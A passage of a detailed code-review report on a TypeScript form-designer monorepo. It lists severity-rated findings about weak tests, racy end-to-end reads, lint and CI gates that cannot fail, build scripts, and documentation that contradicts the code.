- **[MEDIUM]** **[E3]** `apps/demo-server/src/index.test.ts:1` — `readStore`'s "refuse rather than rebuild" branch and the listing's row filters are untested; nothing ever writes a corrupt store. Replace `readStore`'s inner `catch` with `return {}` and the suite is green while the next write silently replaces every stored form with an empty object — which the comment describes as a shipped 500 ("one interrupted `writeFile` costs every stored form").
- **[MEDIUM]** **[E3]** `apps/demo-server/src/index.test.ts:156` — `put()` always builds a document whose `id` matches the URL and always passes `validateDocument`, so both of PUT's 422 branches are untested.
- **[LOW]** **[E3]** `apps/demo-server/src/index.test.ts:350` — `it('still leaves out an answer to a question the form is not asking')` depends on a `PUT` performed inside the *previous* `it`. Run in isolation or after a reordering, the wizard is not in the store and the route answers 404.
- **[LOW]** **[E2]** `apps/demo-server/src/index.test.ts:403` — runs on real timers, so `stopper`'s 5-second `setTimeout(exit, …)` fires after the test finishes and calls `exit` a second time. Harmless only because `exit` is a local `vi.fn` and the timer is `unref`'d; the sibling at `:417` correctly uses fake timers in a `try/finally`.
- **[NOTE]** — checked and sound: the file binds no port, removes its temp directory in `afterAll` with `{ recursive: true, force: true }` so the failure path still cleans up, and covers oversized bodies on both the declared-`content-length` and streaming paths, asserting the *mechanism* rather than only the status.

---

# Area H — build-failing guards and the browser suite

## test/a11y.test.tsx

- **[MEDIUM]** **[E4]** `test/a11y.test.tsx:197-207, 234-244, 246-256, 278-296` — four audited states have no anchor proving the state was reached, although the docblock says "Each anchor is an element only that panel draws"; `showing()` is called in exactly three tests. The condition test asserts only that `selectOptions(getByLabelText('Show when'), 'condition')` succeeded, which is a statement about the `<select>`, not about the editor it should mount. Make the condition editor render `null` for that mode: `selectOptions` still resolves, `audit()` still sees a >10-element subtree and non-empty `passes`, and the test stays green having audited a DOM with no condition editor in it — the regression its own comment says it exists to catch.
- **[MEDIUM]** **[E3]** `test/a11y.test.tsx:123-142` — `audit()` reads `results.violations` and never `results.incomplete`, so any rule axe cannot decide in jsdom is reported as clean. `NEEDS_LAYOUT` disables three rules by name on the theory that everything else is decidable here; nothing verifies that. A rule that becomes undecidable moves from `violations` to `incomplete` and the audit goes green with no change to the count of applied rules.
- **[LOW]** **[E5]** `test/a11y.test.tsx:313` — the comment points at `e2e/dialog.spec.ts` for the modal behaviour jsdom cannot provide. That file does not exist; the checks are in `e2e/document.spec.ts:276-330`. A next engineer following the pointer finds nothing and may conclude the coverage is absent.
- **[NOTE]** `test/a11y.test.tsx:175` says "Four of these cases clicked a tab and then asserted only that axe found no violations" while `showing()` guards three.

## test/contrast.test.ts

- **[MEDIUM]** **[E4]** `test/contrast.test.ts:415-462` — the documentation-figure check has no control of its own against an empty `MEASURED`, so a name-filtered run passes it having compared nothing: `MEASURED` is module state filled by `on()` at execution time, and the only non-empty assertion lives in a *different* test. Run `vitest run -t "quotes the lowest pair"` — every `describe.each` body is filtered out, the loop never executes, and the guard that exists to keep `docs/accessibility.md` honest reports success while asserting zero pairs.
- **[MEDIUM]** **[E4]** `test/contrast.test.ts:200-202` — `--fs-accent` is asserted only against `--fs-bg-panel` at the 3:1 UI-component floor, but `designer.css:644` uses it as `color` on a 10px uppercase label (body text, so 4.5:1 applies) and `:808`/`:823` draw the drop indicator over the canvas and over the kit's own surface, not over a panel. Any accent between 3:1 and 4.5:1 on the panel leaves this suite green while the label fails AA.
- **[MEDIUM]** **[E5]** `test/contrast.test.ts:508-548` — "no colour is written outside the token blocks" only matches `#hex`, and `designer.css` writes literal colours in `rgb()` form outside every token block: `:497`, `:818-819`, `:839`, `:936`, `:1129`. The drop-bar halo is load-bearing by its own comment — it is what separates the drop bar from whatever the kit paints — and it is neither themeable nor measurable. The docblock's justification covers `color-mix` and `rgb(from …)`, which build on tokens; it does not cover `rgb(255 255 255 / 65%)`, which builds on nothing. The HTML kit puts the same kind of value in a token.
- **[MEDIUM]** **[E3]** `test/contrast.test.ts:464-492` — the "every border token, or say why not" completeness net reads `designerCss` only, and `--fs-` cannot match `--fsh-`, so the HTML kit is outside the check entirely. `--fsh-border` is measured today only because three `it` blocks name it by hand; a new `--fsh-field-border` would be measured by nothing and listed by nobody — exactly the position `--fs-control-border` was in, in the other stylesheet.
- **[NOTE]** `test/contrast.test.ts:148, 236` — both dark palettes are labelled `"…, dark"`, so `MEASURED` holds four palette keys for six measured palettes. Safe only because a separate test asserts the two blocks are identical.

## test/contrast.ts

No issues found.

## test/count-reporter.ts

- **[HIGH]** **[E4]** **(Verified.)** `test/count-reporter.ts:136-152` — the liveness marker is written by `onInit`, not by the finish hook, so the guard cannot detect the failure its own comment describes. Confirmed by grep: the single `writeFileSync(REPORTER_MARK, …)` is at `:147` inside `onInit`; `report()` neither writes nor touches it; `docs.test.ts:203-206` asserts only that a mark with this run's pid exists, then deletes it. Delete both `onFinished` and `onTestRunEnd` from the class — vitest still constructs the reporter and still calls `onInit`, the mark is written with this pid, "is being watched by a reporter that is still running" passes, and no documented count is ever compared again. The comment states this is "what would notice if it implemented neither"; it would not.
- **[MEDIUM]** **[E4]** `test/count-reporter.ts:130` + `test/docs.test.ts:206` — `REPORTER_MARK` is a fixed path in `tmpdir()`, written once per Vitest instance and deleted by a test, which breaks watch mode and any two concurrent runs on one machine. `onInit` is called from `start()`/`init()` only; watch reruns go through `onWatcherRerun` and never re-enter it. In watch mode the rerun's failure reads "the count reporter left no mark from this run… Check the hook names against the installed vitest" — pointing the next engineer at vitest's API when the cause is that the marker is per-instance and the test consumed it.
- **[LOW]** **[E4]** `test/count-reporter.ts:55-64` — the `>= 100` filter is the only thing separating the unit total from the end-to-end total. When the browser suite passes 100 tests, `totals()` starts matching the Playwright figure in `CLAUDE.md` and reports "the documented suite size is wrong" — a message naming the unit suite for a figure that is about Playwright.
- **[NOTE]** `test/count-reporter.ts:166` — under vitest 3 `onTestRunEnd` receives `TestModule` objects rather than `File` tasks, and `countTests` matches on `task.type === 'test'` and recurses into `task.tasks`, neither of which a `TestModule` has. Installed vitest is 2.1.9, which never calls `onTestRunEnd`, so this is untested. The one check that settles it: upgrade to vitest 3 in a branch and see which hook `report()` receives.

## test/docs.test.ts

- **[MEDIUM]** **[E5]** `test/docs.test.ts:743-772` — the axe-state count is sliced to the end of the *file*, not the end of the axe describe, so `states` counts the 9 `it(` in that describe plus the 2 in the MUI-kit describe — 11 — while the comment claims the opposite ("a helper or an unrelated test in the same file cannot inflate it"). The regex matches `docs/accessibility.md:23` and nothing else, so `accessibility.md:122` ("nine states") and `README.md:126` ("eleven states") are both unguarded and now contradict each other.
- **[MEDIUM]** **[E4]** `test/docs.test.ts:272` — the accessibility-obligations table is checked with `suite.includes(row.attribute)`, a raw substring search over the whole of `test/kit-contract.test.tsx`, comments included; `aria-invalid`, `aria-required` and `role="alert"` all appear in that file's prose as well as in its assertions. Delete the assertion and leave the comment that names the attribute: the row stays marked `yes`, and `02-kit-contract.md` goes on telling third-party kit authors that a rule is enforced when nothing runs it.
- **[MEDIUM]** **[E3]** `test/docs.test.ts:789-798` — the link check runs over a hardcoded eight-file list, so any document added under `docs/` afterwards is never link-checked; `docs/decisions.md` is a concrete case — parsed by the decision-log guard, links checked by nothing. The spec directory has the derived treatment; this list does not.
- **[LOW]** **[E5]** `test/docs.test.ts:1007-1044` — four of the nine `DISPROOF` entries carry `needle: null`, so `mentions()` is never called and the assertion compares two empty arrays. Documented and deliberate, but it means 44% of the "a section that calls itself planned is still planned" suite is a prose review.
- **[LOW]** **[E3]** `test/docs.test.ts:89-94` — `browserTestsThatExist()` counts `/^test\(/gm` in the spec sources; it is a text count, not evidence that Playwright collected or ran 78 tests. A spec file that fails to import still contributes its lines.
- **[LOW]** **[E3]** `test/docs.test.ts:540-555` — the events reader takes a fixed 2500-character lookahead; the largest real gap today is 1267, so the margin is under 2×. A definition that grows past it drops out of the map and the failure surfaces as "the events table and the kits disagree about onChange" — a message about the spec for a cause that is a magic number in the test.
- **[NOTE]** `test/docs.test.ts:867-890` — the same twelve-line comment written twice, the second copy above a line it does not describe.

## test/eslint.config.test.ts

- **[HIGH]** **[E4]** **(Verified. Converged with Area I.)** `test/eslint.config.test.ts:201` — the guard records only `message.ruleId` and discards severity, so it cannot tell an invariant that fails the build from one that prints a warning and passes. Read directly: `result.messages.map((message) => message.ruleId ?? 'parse error: ' + message.message)`; `LintMessage.severity` is never read, and a warning carries the same `ruleId` as an error. `package.json:15` is `"lint": "eslint ."` with no `--max-warnings`, and CI runs exactly that, so `eslint .` exits 0 on warnings. Change `'no-restricted-imports'` to `['warn', …]` at `eslint.config.js:159` and `:208`, and `'no-restricted-syntax'` at `:184` and `:222` — all fifteen cases still report their rule ids, this test stays green, and invariants 1 and 2 stop failing the build. Turning a rule fully `off` would be caught; downgrading it would not.
- **[MEDIUM]** **[E4]** `test/eslint.config.test.ts:45-183` — only `@mui` of the five entries in `COMPONENT_LIBRARIES` is ever exercised; `@emotion`, `antd`, `@chakra-ui` and `@radix-ui` appear in no fixture. Delete `'antd'` and `'@chakra-ui'` from the list and every case still passes while the designer can import Ant Design. The file's own opening argument is that "fixing one side of a symmetry is the failure this whole remediation run exists to stop"; four fifths of this symmetry is untested.
- **[LOW]** **[E3]** `test/eslint.config.test.ts:247-257` — the assertion is on rule id only, never on the message, and those messages are what `README.md:137-143` promises a contributor will read before silencing a rule. They could be emptied or made to name the wrong invariant with nothing going red.
- **[NOTE]** `test/eslint.config.test.ts:33` — fixtures are written into `packages/core/src` and `packages/designer/src`. `cleanUp` runs in a `finally` and an `afterAll`, neither of which survives SIGKILL, and nothing in CI asserts the working tree is clean after `pnpm test`.

## test/readme.test.ts

- **[MEDIUM]** **[E5]** **(Verified.)** `test/readme.test.ts:58-71` + `190-208` — the root `README.md` is outside `READMES`, so the most-read examples in the repository are neither compiled nor checked against the `applyChange` rule, and the one at `README.md:92-98` is exactly what that rule refuses. Confirmed by reading both: `READMES` is `readdirSync(at('packages'))` filtered to non-private packages; `README.md:95` is `<FormRenderer document={doc} kit={muiRendererKit} data={data} errors={errors} onChange={set} />`, which matches both filters at `:195-196` and contains no `applyChange`, so `expect(block.code).toContain('applyChange')` would fail if the file were in scope. `packages/renderer/README.md:30` does it correctly. See Area I for the consequence.
- **[LOW]** **[E3]** `test/readme.test.ts:75` — `blocks()` matches only ```` ```ts ```` and ```` ```tsx ```` fences, so an example written as ```` ```typescript ````, ```` ```js ```` or ```` ```jsx ```` is invisible to the compile check, the install-line check, the subpath check and the `applyChange` rule at once, and the "shows at least one example" test only requires that one qualifying block exists.
- **[LOW]** **[E3]** `test/readme.test.ts:84` — `installed()` recognises three package-manager spellings; a README written with `pnpm i` or `bun add` produces an empty set, which fails loudly but reports every import as missing for a reason that has nothing to do with the imports.
- **[NOTE]** `test/readme.test.ts:248-253` — every block is written into one flat workspace, so two blocks declaring the same top-level `const` collide across files with an error attributed to whichever README came second.

## e2e/authoring.spec.ts

- **[MEDIUM]** **[E4]** `e2e/authoring.spec.ts:50` — `expect(await designer.rootChildren()).toContain('website')` is a single read of `localStorage` taken immediately after the refused rename, and the value it expects is the value that was already there. `canvas.spec.ts:196-205` documents this repository's own finding that the playground persists from a React passive effect while Playwright's input actions resolve on event dispatch, so "a single read can therefore be of the value from before the gesture". The read cannot distinguish "the rename was refused" from "nothing has been committed yet"; `expect.poll` is the fix already used a few lines away in other specs.
- **[LOW]** **[E3]** `e2e/authoring.spec.ts:69` — `getByLabel('Value')` is unscoped while the `Message` field on the same row is deliberately scoped to `.fs-rule` filtered by the rule name, for the stated reason that a second row would silently fill the wrong box. `Value` has the identical exposure.

## e2e/canvas.spec.ts

- **[MEDIUM]** **[E4]** `e2e/canvas.spec.ts:151-153` — the palette entry is measured with a bare `boundingBox()` and nothing scrolls it into view — the repository's own trap 13, still live. `dragFrom` exists precisely for this and every other palette drag in the suite uses it. Failure scenario: the `input` palette group grows one row on Linux's font metrics, `Text field` moves below a 720px viewport, `boundingBox()` still returns a plausible page rectangle, `mouse.down()` presses outside the window, the gesture becomes a text selection, and the failure lands as a wrong stack order — deterministic per platform and indistinguishable from flake.
- **[MEDIUM]** **[E4]** `e2e/canvas.spec.ts:133, 141, 174, 261, 289` — five one-shot `rootChildren()` reads taken immediately after a gesture, in a file that documents at `:196-205` why that read is racy and uses `expect.poll` twice. The poll was introduced only where a stale read would *pass*; these five are places where a stale read *fails*, so they were left alone — which converts the same mechanism into a false failure. The read at `:133` comes straight off `mouse.up()` inside `dragOnto`, which does not wait for a React commit.
- **[LOW]** **[E3]** `e2e/canvas.spec.ts:118` — `.MuiPopover-root, .MuiMenu-root` ties "clicking a select does not open its dropdown" to MUI being the playground's default kit; the event-capture behaviour it guards belongs to the canvas, not to MUI, so under the HTML kit this becomes a count of a selector nothing emits.

## e2e/document.spec.ts

- **[MEDIUM]** **[E4]** `e2e/document.spec.ts:287-317` — "focus stays inside the open dialog" has no positive half, so it passes for a dialog with nothing focusable in it: `offender` returns `null` both for `document.body` and for anything inside a `dialog`, and the only assertion is `expect(outside).toEqual([])`. Nothing asserts that focus ever landed inside the dialog during the fifteen presses. Render the dialog's contents as `null` and a test named for a focus trap goes green over a dialog with no focus to trap. The positive assertion exists in another file (`keyboard.spec.ts:146`), so the suite as a whole is covered and this test on its own is not.
- **[LOW]** **[E3]** `e2e/document.spec.ts:82-97` — "a duplicate key is caught even though the JSON is well formed" asserts the alert text and stops, while every sibling refusal test in the file also asserts the document is unchanged. A build that reported the duplicate *and applied the document anyway* would pass under a name that means the opposite.
- **[NOTE]** `e2e/document.spec.ts:176-202` and `240-264` overlap; the second is strictly stronger (it edits first, which the first one's own comment says is the whole defect).

## e2e/harness.ts

- **[LOW]** **[E3]** `e2e/harness.ts:113-116` — `openTab` waits for `aria-selected` on the *tab*, not for anything the panel draws, and `select` waits on the tree row rather than the inspector. Same gap `test/a11y.test.tsx` fixed with `showing()`: every spec that opens a tab and then asserts on a control inside it fails several steps downstream of a panel that did not render.
- **[LOW]** **[E3]** `e2e/harness.ts:118-120` — `undo()` clicks and returns without waiting for any consequence, so the calling spec owns the race; `keyboard.spec.ts:107` takes a one-shot read directly after it.
- **[NOTE]** `e2e/harness.ts:57-59` — `localStorage` is cleared per test via `addInitScript` and Playwright gives each test its own context, so `playwright.config.ts:22-23`'s justification for `fullyParallel: false, workers: 1` ("several tests drag components around the same document") is not true of the current harness. Whatever the real reason for serialising is, it is not written down — the shape that gets a constraint removed by someone who checks the stated one.

## e2e/hidden.spec.ts

- **[LOW]** **[E3]** `e2e/hidden.spec.ts:62-63` — the target is measured with `stableBox` before `dragFrom` scrolls the source, inverting the ordering `stableBox`'s own docblock requires ("the caller has to finish all its scrolling before any measuring starts"). `dragOnto` gets this right. Safe today only because the palette and the canvas are separate scroll containers — an incidental fact, not the rule the helper states.
- **[LOW]** **[E3]** `e2e/hidden.spec.ts:17-19` — every test hides through `selectOption('never')`; the `condition` branch, which is what a real author uses, is never dropped into or previewed here, so "a component a condition hides is still authorable" is proved for the one visibility mode that is not a condition.

## e2e/keyboard.spec.ts

- **[MEDIUM]** **[E4]** `e2e/keyboard.spec.ts:64, 101, 107, 158, 229, 239` — six one-shot `rootChildren()` reads immediately after a key press, against a value the playground writes from a React passive effect. This file already uses `expect.poll` where a stale read would pass. Lines 229 and 239 are the worst case: `press('Delete')` followed directly by `expect(await designer.rootChildren()).not.toContain('email')`, with no intervening awaited assertion to absorb the commit, so on a loaded runner a correct build fails a test named for a working delete.
- **[LOW]** **[E3]** `e2e/keyboard.spec.ts:265-307` — "Tab walks the shell from the top" presses Tab twelve times and asserts that `body` never appears, which holds only while the page offers at least twelve tab stops before the browser hands focus back to the document — and `document.spec.ts:301-305` documents that Chromium reports `body` on exactly that step. A positional test whose pass depends on the fixture happening to be large enough.

## e2e/repeater.spec.ts

- **[LOW]** **[E3]** `e2e/repeater.spec.ts:87` — `.fs-canvas__data pre` `.first()` with `not.toContainText('repeater')` is a negative assertion against the first `<pre>` in a pane that holds two sections. It passes for a data pane rendering `{}`, for one rendering nothing inside the `pre`, and for one whose section order changed.
- **[NOTE]** — the file is the documented exception to the key/dataKey trap and says so; `a row is addressed by the repeater data key, not its node key` is the strongest test in the e2e suite and does make the two names differ.

## e2e/style.spec.ts

- **[LOW]** **[E5]** `e2e/style.spec.ts:104-106` — the comment states "The earlier tests in this file set real padding, so a `[data-fs-key]` rule is there to find." No state carries between these tests: `localStorage` is cleared before every page load and each test gets a fresh context. The rule is on the page only because *this* test sets padding at `:89-90`, which its own earlier comment correctly explains. A reader who believes the later comment can delete those two lines and turn the assertions into checks against a page with no per-component stylesheet.
- **[LOW]** **[E3]** `e2e/style.spec.ts:149-150` — the typeface test asserts only that the frame's font and size *differ* from the shell's; any difference passes, including a wrong one. The property under test is that the frame resets to the document default rather than inheriting, and inequality does not express that.

## e2e/viewport.spec.ts

- **[LOW]** **[E3]** `e2e/viewport.spec.ts:33` — `expect(surface.width - frameBox.width).toBeLessThanOrEqual(64)` is a one-sided bound under a test named "desktop is the default and constrains nothing"; a frame *wider* than the surface passes, and so does one exactly as wide with the surface's padding gone. The paired inline-style check at `:27` is what carries the test.
- **[NOTE]** `e2e/viewport.spec.ts:44, 48` — 768 and 390 are pinned as literals with no link to wherever the designer declares those widths, so a change to the device table fails here with two bare numbers and no pointer to the source of truth.

---

# Area I — build configuration, CI, scripts, and the non-spec documents

## eslint.config.js

- **[HIGH]** **[E5]** **(Verified.)** `eslint.config.js:141` — the block spreads `reactHooks.configs.recommended.rules` without overriding severity, and three of those rules ship as `"warn"`; `pnpm lint` is `eslint .` with no `--max-warnings`, so none of them can fail CI. Confirmed by reading the config block (`rules: { ...reactHooks.configs.recommended.rules }`, no override) and by enumerating the plugin's own `configs.recommended`: `react-hooks/exhaustive-deps`, `react-hooks/incompatible-library` and `react-hooks/unsupported-syntax` are `"warn"`; the other thirteen are `"error"`. Failure scenario: the comment at `:125-137` argues that `exhaustive-deps` had to reach `store.ts` "which is where every hook in the designer actually lives" — it now reaches it and reports at warn level, so a `useCallback` in `store.ts` missing a dependency prints a yellow line, `eslint` exits 0, CI's **Lint** step is green, and `test/eslint.config.test.ts`'s hook case still passes because it inspects `ruleId` and never `severity`. The guard and the gate disagree, and the gate is the one that cannot fail. (Given the `setProp` and `renameKey` findings in Area B, this is not hypothetical: it is the rule most likely to have had something to say.)
- **[MEDIUM]** **[E5]** **(Verified.)** `eslint.config.js:59-66` — `dynamicImportOf`/`dynamicImportUnder` build `ImportExpression[source.value=/…/]`, which matches only a string `Literal`, so a template-literal specifier defeats both invariant guards. Read directly; the esquery attribute selector reads `source.value`, and a `TemplateLiteral` node has no `value`. Measured by the reviewing agent with `Linter.verify`: `import('@mui/material')` reports; `` import(`@mui/material`) `` does not, nor do `` import(`@mui/${n}`) ``, `import(p)` or `import('@mui/' + 'material')`. The config's own comment says "a dynamic import is the form somebody writes precisely when they are working around a restriction" — the next step in working around it is one backtick. `test/eslint.config.test.ts`'s six dynamic-import fixtures are all string literals.
- **[MEDIUM]** **[E3]** `eslint.config.js:73` — `ignores` omits `coverage/`, which the documented `pnpm test:coverage` produces, so a later `pnpm lint` collects istanbul's generated `.js` files, which fall under the type-aware block and produce the "TSConfig does not include this file" parser error — a lint failure, not a warning. `docs/build-out/triage.md:754` records this as a one-line cosmetic; it is not cosmetic, it breaks the gate for anyone who ran coverage first.
- **[LOW]** **[E4]** `eslint.config.js:111, 139` — the `react-hooks` rules reach `packages/*/src/**` and `apps/*/src/**` but not `test/**/*.tsx`, where `a11y.test.tsx` and `kit-contract.test.tsx` both mount React. Same shape as the block's own comment, one directory over.

## vitest.config.ts

- **[LOW]** **[E2]** `vitest.config.ts:29` — `exclude` replaces vitest's defaults rather than extending `configDefaults.exclude`, dropping the config-file and `.git` exclusions. Harmless only because `include` is an explicit allowlist; a future broadening reopens it.
- **[LOW]** **[E2]** `vitest.config.ts:44` — `coverage.include` is `packages/*/src/**` while `include` collects `apps/*/src/**/*.test.ts`, so the demo server's suite runs and contributes no coverage line, and the comment beside it explains only the test-file exclusion.

## playwright.config.ts

No issues found.

## aliases.ts

No issues found.

## tsconfig.json

No issues found.

## tsconfig.base.json

No issues found.

## tsconfig.eslint.json

- **[LOW]** **[E5]** `tsconfig.eslint.json:4-5` — the docblock states "The per-package configs exclude tests on purpose, because tests must not ship in dist"; `packages/core/tsconfig.json`'s `exclude` is `["src/**/*.test.ts"]` only, with no `*.test.tsx`, while the other four packages exclude both. The first `packages/core/src/*.test.tsx` anybody writes is compiled into `dist` and published. This is precisely the `*.ts`-scoped-rule failure `eslint.config.js:150-156` describes for invariant 1, in the build configs instead of the lint configs, and it is caught only incidentally by `check-dist.mjs`'s source-map check.

## package.json

- **[HIGH]** **[E5]** **(Verified.)** `package.json:15` — `"lint": "eslint ."` has no `--max-warnings 0`, which is what makes the three warn-severity rules above unable to fail CI. Same defect as the `eslint.config.js` finding, seen from the line CI actually runs; the fix belongs on one side or the other, and `--max-warnings 0` fixes both at once.
- **[MEDIUM]** **[E4]** `package.json:52` — `engines.node: ">=22.0.0"` contradicts the documented development floor: `CLAUDE.md:86-87` says "Node 22.6+ to develop -- the demo server runs on `--experimental-strip-types`, which is where that arrived", and `apps/demo-server/package.json` declares `">=22.6.0"`. A contributor on Node 22.3 satisfies the root manifest and gets `bad option` from `pnpm dev:server`. `docs/build-out/queue.md:293-295` lists this drift as in scope for an item that is ticked; the root/`CLAUDE.md` half is still there.

## pnpm-workspace.yaml

No issues found.

## .github/workflows/ci.yml

- **[MEDIUM]** **[E4]** `.github/workflows/ci.yml:78-84` — the failure artifact names `playwright-report/`, which this configuration never produces: `playwright.config.ts:39` sets `reporter: [['github'],['list']]` on CI, and Playwright writes `playwright-report/` only for the `html` reporter. `upload-artifact` v4 defaults `if-no-files-found: warn`, so the step succeeds on the `test-results/` half and silently drops the half it is named for. Traces and screenshots do land, so the artifact is not empty — but `.claude/skills/write-tests/SKILL.md:245` tells the next person "read the screenshot… it is in the artifact", and half the declared path has been dead the whole time.
- **[LOW]** **[E2]** `.github/workflows/ci.yml:41` — `actions/checkout` runs without `persist-credentials: false`, leaving the job token in `.git/config` for a job that then executes pull-request-authored code. Mitigated by `permissions: contents: read` and by the `pull_request` trigger (not `pull_request_target`), so the exposure is a read-only token; still the cheap hardening.
- **[LOW]** **[E5]** `.github/workflows/ci.yml:24-32, 41-45, 78` — every action is pinned to the tip of v4, and all four of those releases run on the Node 20 runtime GitHub has deprecated; `docs/build-out/found.md:75-88` records the resulting warning. There is no `.github/dependabot.yml`, so the comment's "bumps are manual" has nothing scheduling them.

## scripts/check-dist.mjs

- **[MEDIUM]** **[E4]** **(Verified.)** `scripts/check-dist.mjs:63-83` — the comment claims this catches "a wrong `exports` condition", and it cannot: the script builds `packages/<name>/dist/index.js` itself and imports that file URL directly, so Node's package-`exports` resolution is never invoked for any `@formsmith/*` specifier. Confirmed by grep: `exports` appears in this file only inside that comment; no line reads a `package.json`, and the only manifest read is `npm pack --dry-run`, which reports `files`. Point `exports["."].default` at `./dist/main.js`, or rename the designer's `"./styles.css"` target, and every check here still passes. Nothing else covers it either — `test/readme.test.ts:143-171` verifies a subpath is *a key* in `exports`, never that its target exists, and `aliases.ts` redirects every in-repo specifier to `src`. The one thing in the repository that "reads what a consumer installs" does not read the field a consumer resolves through.
- **[LOW]** **[E4]** `scripts/check-dist.mjs:42, 54` — `existsSync` is satisfied by a directory and by a stale artefact, so a `dist` left over from a previous build, or a zero-byte `index.d.ts`, passes both loops. Immaterial on CI's fresh checkout; it means the script is not the local safety net its own preamble argues for.
- **[NOTE]** **[E2]** `scripts/check-dist.mjs:116` — `output.slice(output.indexOf('['))` assumes the first `[` on npm's stdout opens the JSON array; any future npm that prefixes stdout fails with a `JSON.parse` stack rather than a diagnosis.

## scripts/copy-assets.mjs

- **[LOW]** **[E4]** `scripts/copy-assets.mjs:31` — `readdirSync(src, …)` throws a bare `ENOENT` for any directory under `packages/` with no `src/`, and because `check-dist.mjs:21` imports this module for `ASSETS`, the throw happens at import time — before `check-dist.mjs`'s deliberate "so nothing was checked" guards can run. A scratch or partially-created package directory turns the asset step and the **Check build output** step into an unexplained stack trace after `tsc --build` already succeeded.
- **[NOTE]** **[E4]** `scripts/copy-assets.mjs:21-40` — the derivation takes *every* `.css` under a package's `src`, so a fixture or scratch stylesheet is copied into `dist`, published, and then required to exist by `check-dist.mjs`. The derivation is the right call; there is no filter for "a stylesheet the package actually publishes".

## .npmrc

No issues found.

## .gitignore

No issues found. (Checked the load-bearing claim at `:25-28`: Prettier 3.9.6's `ignorePath` default is `[".gitignore", ".prettierignore"]`, so gitignoring `apps/demo-server/forms.json` does keep it out of `format:check`, and `coverage/` is likewise invisible to Prettier. ESLint reads neither file, which is the separate finding above.)

## .prettierrc.json

No issues found.

## .prettierignore

- **[LOW]** **[E5]** `.prettierignore:11-13` — the block excludes `docs/reviews` on the ground that "Reformatting one would change the line numbers its own findings cite, and every queue item cites them too", but `docs/reports/` is neither ignored nor gitignored and holds four received or derived reports that `docs/build-out/RUN.md:9` and `queue.md` cite by name. Same rationale, half applied.

## .editorconfig

No issues found.

## .gitattributes

No issues found.

## LICENSE

No issues found.

## README.md

- **[MEDIUM]** **[E5]** **(Verified.)** `README.md:92-98` — the runtime example writes an answer without `applyChange` and passes a one-name handler to a two-argument callback: `<FormRenderer … onChange={set} />`, where `FormRendererProps.onChange` is `(address: string, value: JsonValue) => void`. `test/readme.test.ts:190-209` enforces exactly this rule — written because the wrong shape "loses every repeater row" — but its `READMES` list is built from `readdirSync('packages')`, so it never reads the root `README.md`, and `test/docs.test.ts` reads the file for links only. Neither of the root README's two `tsx` blocks is compiled by anything. `packages/renderer/README.md:13-29` teaches the correct pattern; the far more widely read root README teaches the shape the guard exists to forbid, in the one file the guard cannot see.
- **[LOW]** **[E5]** `README.md:126` — "axe-core runs over the designer in eleven states" contradicts `docs/ROADMAP.md:62` and `docs/spec/00-product.md:91`, which both say nine. Eleven is the number `test/docs.test.ts` enforces and it is right for the whole file; the guard's regex only matches the phrasing in `docs/accessibility.md`, so the three "nine" sites are unchecked.
- **[LOW]** **[E2]** `README.md:72` — `pnpm build # tsc --build across all packages` omits the second half of the script, which is the step that puts the two published stylesheets in `dist`.

## CLAUDE.md

- **[MEDIUM]** **[E5]** `CLAUDE.md:74-76` — "the per-package configs exclude tests so they stay out of `dist`" is true of four of the five; `packages/core/tsconfig.json` excludes `*.test.ts` only. Flagged here as well as under `tsconfig.eslint.json` because this is the sentence a contributor reads before adding a test file.
- **[LOW]** **[E4]** `CLAUDE.md:66-69` — "CI runs every one of these, then `node scripts/check-dist.mjs`" and "The end-to-end suite runs last, after the build" are both contradicted by `.github/workflows/ci.yml:73-103`: after **End-to-end** come the failure-artifact upload, **Build the playground** (which `CLAUDE.md` does not mention at all) and only then **Check build output**. The playground build is a real gate — its own CI comment says it is the only thing that exercises the two published stylesheet subpaths.
- **[LOW]** **[E2]** `CLAUDE.md:62` — `pnpm build # tsc --build, then copies designer.css`. `copy-assets.mjs` derives the asset list from the directory and copies every stylesheet under `packages/*/src` — two today — and the script's own docblock exists because naming one of them by hand was the previous bug.

## .claude/skills/write-tests/SKILL.md

- **[LOW]** **[E5]** `.claude/skills/write-tests/SKILL.md:174` — "byte-identical output across all 911 unit tests and 78 tests in a real browser" pairs a stale unit figure with a live browser figure in one sentence. The `78` is guarded and current; `911` is against an actual 1967 and is guarded by nothing, because `count-reporter.ts`'s `DOCS` list is only README/CLAUDE/ROADMAP while its `totals()` pattern would match `911 unit tests` if it were included. A reader cannot tell that one of the two numbers is historical and the other is not.

## .claude/skills/codebase-design/SKILL.md

No issues found.

## .claude/skills/codebase-design/DEEPENING.md

No issues found.

## .claude/skills/codebase-design/DESIGN-IT-TWICE.md

- **[NOTE]** **[E2]** `DESIGN-IT-TWICE.md:30` — "Include both [SKILL.md](SKILL.md) vocabulary and CONTEXT.md vocabulary in the brief". No `CONTEXT.md` was vendored and none exists anywhere in the repo. `docs/build-out/RUN.md:86-92` sends the build-out agent here specifically so the contract is "followable from a fresh clone"; this instruction is not. `SOURCE.md` forbids editing the copy, so the note belongs in `SOURCE.md` or a wrapper.

## .claude/skills/codebase-design/SOURCE.md

- **[NOTE]** **[E4]** `SOURCE.md:14-17` — the re-sync instruction is `vendor-skill.ps1 -Resync -Name codebase-design`, and no `vendor-skill.ps1` exists in this repository. Same class as the `CONTEXT.md` note: the file reads as a runnable procedure and is not one from a clone.

## .claude/skills/codebase-design/agents/openai.yaml

No issues found. (Three lines of interface metadata; read by the lead reviewer rather than by a slice agent, because no slice reported on it.)

## .claude/skills/steelman/SKILL.md

No issues found.

## .claude/skills/steelman/SOURCE.md

No issues found.

## docs/ARCHITECTURE.md

- **[LOW]** **[E5]** `docs/ARCHITECTURE.md:141-142` — "there are about forty of them, `.fs-toolbar`, `.fs-panel`, `.fs-tree__row` and the rest". A distinct-class count over `designer.css` returns 102. Nothing checks the figure, and the sentence is the one a reader uses to size the invariant-3 surface.

## docs/ROADMAP.md

- **[LOW]** **[E5]** `docs/ROADMAP.md:62` — "axe runs over the designer in nine states" against `README.md:126`'s eleven and the eleven cases `test/docs.test.ts` actually enforces. Free to drift because the guard's regex matches only the phrasing in `docs/accessibility.md`.

## docs/accessibility.md

- **[LOW]** **[E5]** `docs/accessibility.md:23` vs `:122` — the same document says "eleven states" in the enforced-by-tests table and "nine states" in Known gaps, with nine then listed by name. Only `:23` is guarded, and only `:23` was updated when the two MUI-kit states were added, so the file contradicts itself about the single figure it exists to make checkable. `:122`'s list of nine is an accurate description of one describe; the honest repair is to say which describe each number refers to, as `README.md:127-128` already does.

## docs/decisions.md

